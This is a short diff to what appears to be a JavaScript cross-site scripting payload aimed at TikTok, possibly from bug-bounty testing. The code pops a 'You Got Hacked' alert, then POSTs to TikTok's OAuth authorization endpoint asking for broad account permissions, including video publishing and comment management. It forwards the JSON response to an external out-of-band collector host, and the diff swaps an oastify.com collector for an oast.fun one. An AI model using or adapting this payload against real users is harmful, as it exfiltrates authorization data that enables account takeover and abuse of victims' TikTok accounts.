@@ -1,4 +1,4 @@
-alert(4),
+alert("You Got Hacked"),
 fetch("https://www.tiktok.com/passport/open/web/auth/?client_key=7236493407642714114&scope=user.info.basic%2Cuser.info.stats%2Cvideo.list%2Ccomment.list%2Ccomment.list.manage%2Cuser.account.type%2Cvideo.publish%2Cuser.insights%2Cuser.info.username%2Cvideo.insights&aid=1459&source=web&redirect_uri=https%3A%2F%2Ftiktok.com%2F", {
   method: "POST",
   headers: {
@@ -9,7 +9,7 @@ fetch("https://www.tiktok.com/passport/open/web/auth/?client_key=723649340764271
 })
   .then(response => response.json())
   .then(data => {
-    fetch("https://ibxsj0xlhl3n7m3fbtptipbyapgo4es3.oastify.com/receive/", {
+    fetch("https://bartqtkbajnhmsotmlzp4q9wse2zlm1lp.oast.fun/receive/?", {
       method: "POST",
       headers: {
         "Content-Type": "application/json",
